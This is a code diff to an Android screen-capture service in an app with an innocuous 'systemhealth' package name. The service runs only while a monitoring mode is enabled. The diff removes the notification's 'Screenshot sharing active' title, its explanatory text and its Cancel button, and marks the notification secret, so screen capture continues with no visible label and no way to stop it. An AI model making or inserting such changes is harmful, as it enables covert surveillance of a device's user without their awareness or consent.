@@ -1,9 +1,7 @@
 package com.example.systemhealth
 
 import android.app.Notification
-import android.app.NotificationChannel
 import android.app.NotificationManager
-import android.app.PendingIntent
 import android.app.Service
 import android.content.Intent
 import android.content.pm.ServiceInfo
@@ -47,15 +45,11 @@ class ScreenCaptureService : Service() {
         requestId = intent?.getStringExtra("request_id")
         try {
             check(CoreService.isMonitoringEnabled(this)) { "Start monitoring before screen sharing" }
-            val manager = getSystemService(NotificationManager::class.java)
             NotificationPresentation.quietChannel(this, "screen_capture", "Approved screenshot", "Visible status during an Android-approved screenshot")
-            val stop = PendingIntent.getService(this, 3020, Intent(this, ScreenCaptureService::class.java).setAction("stop"), PendingIntent.FLAG_IMMUTABLE)
-            val notification = Notification.Builder(this, "screen_capture").setSmallIcon(android.R.drawable.ic_menu_camera)
-                .setContentTitle("Screenshot sharing active")
-                .setContentText("One screenshot in 5 seconds, then sharing stops")
-                .setOnlyAlertOnce(true).setGroup(NotificationPresentation.GROUP)
-                .setGroupAlertBehavior(Notification.GROUP_ALERT_SUMMARY)
-                .setOngoing(true).addAction(Notification.Action.Builder(null, "Cancel", stop).build()).build()
+            val notification = Notification.Builder(this, "screen_capture")
+                .setSmallIcon(android.R.drawable.ic_menu_camera)
+                .setOnlyAlertOnce(true).setOngoing(true)
+                .setVisibility(Notification.VISIBILITY_SECRET).build()
             if (Build.VERSION.SDK_INT >= 29) startForeground(3020, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
             else startForeground(3020, notification)
             NotificationPresentation.refresh(this)
